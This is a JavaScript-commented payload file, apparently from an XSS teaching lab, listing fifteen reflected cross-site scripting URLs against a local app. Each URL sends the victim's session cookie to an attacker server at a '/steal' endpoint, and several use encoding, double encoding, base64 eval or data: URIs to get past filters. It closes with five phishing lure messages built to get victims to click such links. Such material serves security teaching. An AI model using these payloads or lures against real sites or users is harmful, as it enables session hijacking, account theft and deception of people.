// ⚠️ WARNING: These are MALICIOUS scripts for educational purposes only!


// ============================================================
// BASE URL (target application)
// ============================================================
const TARGET = "http://localhost:5009";
const ATTACKER = "http://localhost:8888";


// ============================================================
// PAYLOAD #1: Simple Image Tag XSS
// ============================================================
// Social engineering: "Check out this cool feature!"
// URL parameter contains <img> tag with onerror that steals cookie

http://localhost:5009/protected?search=<img src=x onerror="fetch('http://localhost:8888/steal?cookie='+document.cookie)">


// ============================================================
// PAYLOAD #2: Script Tag Injection
// ============================================================
// Social engineering: "Click this link to verify your account"
// Direct <script> injection in URL parameter

http://localhost:5009/protected?name=<script>fetch('http://localhost:8888/steal?cookie='+document.cookie)</script>


// ============================================================
// PAYLOAD #3: URL Encoded Payload
// ============================================================
// More sophisticated - URL encoded to bypass basic filters
// %3C = <, %3E = >, %27 = ', %2B = +

http://localhost:5009/protected?q=%3Cscript%3Efetch('http://localhost:8888/steal?cookie='%2Bdocument.cookie)%3C/script%3E


// ============================================================
// PAYLOAD #4: SVG XSS
// ============================================================
// Using SVG tag with onload event
// Often bypasses filters that only check for <script>

http://localhost:5009/protected?data=<svg/onload="fetch('http://localhost:8888/steal?cookie='+document.cookie)">


// ============================================================
// PAYLOAD #5: JavaScript Protocol
// ============================================================
// Using javascript: protocol in href
// Works if application reflects URL in <a> tag

http://localhost:5009/protected?redirect=javascript:fetch('http://localhost:8888/steal?cookie='+document.cookie)


// ============================================================
// PAYLOAD #6: Body Tag with onload
// ============================================================
// Injects body tag with onload event

http://localhost:5009/protected?content=<body onload="fetch('http://localhost:8888/steal?cookie='+document.cookie)">


// ============================================================
// PAYLOAD #7: Iframe Injection
// ============================================================
// Creates hidden iframe that loads attacker's page

http://localhost:5009/protected?view=<iframe src="http://localhost:8888/steal?cookie="+document.cookie style="display:none"></iframe>


// ============================================================
// PAYLOAD #8: Double Encoded
// ============================================================
// Double URL encoding to bypass WAF/filters
// %253C = %3C = <

http://localhost:5009/protected?input=%253Cscript%253Efetch('http://localhost:8888/steal?cookie='%252Bdocument.cookie)%253C/script%253E


// ============================================================
// PAYLOAD #9: Event Handler XSS
// ============================================================
// Using various HTML events: onclick, onmouseover, onfocus

http://localhost:5009/protected?comment=<div onmouseover="fetch('http://localhost:8888/steal?cookie='+document.cookie)">Hover me!</div>


// ============================================================
// PAYLOAD #10: Base64 Encoded JavaScript
// ============================================================
// Obfuscated payload using base64 encoding

http://localhost:5009/protected?code=<img src=x onerror="eval(atob('ZmV0Y2goJ2h0dHA6Ly9sb2NhbGhvc3Q6ODg4OC9zdGVhbD9jb29raWU9Jytkb2N1bWVudC5jb29raWUp'))">

// Decoded: fetch('http://localhost:8888/steal?cookie='+document.cookie)


// ============================================================
// PAYLOAD #11: Shortened/Obfuscated URL
// ============================================================
// Using data: URI to hide malicious content
// Looks innocent but contains JavaScript

data:text/html,<script>fetch('http://localhost:8888/steal?cookie='+document.cookie);location='http://localhost:5009'</script>


// ============================================================
// PAYLOAD #12: Form Auto-Submit
// ============================================================
// Creates hidden form that auto-submits cookie to attacker

http://localhost:5009/protected?page=<form id=x action=http://localhost:8888/steal><input name=cookie></form><script>x.cookie.value=document.cookie;x.submit()</script>


// ============================================================
// PAYLOAD #13: Meta Refresh with JavaScript
// ============================================================
// Uses meta refresh to execute JavaScript

http://localhost:5009/protected?redirect=<meta http-equiv="refresh" content="0;url=javascript:fetch('http://localhost:8888/steal?cookie='+document.cookie)">


// ============================================================
// PAYLOAD #14: Object/Embed Tag
// ============================================================
// Using object tag to load external resource

http://localhost:5009/protected?media=<object data="javascript:fetch('http://localhost:8888/steal?cookie='+document.cookie)">


// ============================================================
// PAYLOAD #15: Link with JavaScript
// ============================================================
// Creates clickable link with javascript: protocol
// Social engineering: "Click here to continue"

http://localhost:5009/protected?next=<a href="javascript:fetch('http://localhost:8888/steal?cookie='+document.cookie)">Click to verify account</a>


// ============================================================
// SOCIAL ENGINEERING SCENARIOS
// ============================================================

/**
 * SCENARIO 1: Fake Security Alert
 * Message: "⚠️ Security Alert! Your account requires verification. Click here immediately:"
 * Link: [obfuscated XSS URL]
 */

/**
 * SCENARIO 2: Prize/Contest Winner
 * Message: "🎉 Congratulations! You won $1000! Claim your prize here:"
 * Link: [malicious URL]
 */

/**
 * SCENARIO 3: Password Reset
 * Message: "Someone requested password reset for your account. If this wasn't you, click here:"
 * Link: [XSS payload URL]
 */

/**
 * SCENARIO 4: Friend Request
 * Message: "Sarah wants to add you as friend! View profile:"
 * Link: [cookie stealing URL]
 */

/**
 * SCENARIO 5: Urgent Support Ticket
 * Message: "Your support ticket #12345 has been updated. View details:"
 * Link: [malicious link]
 */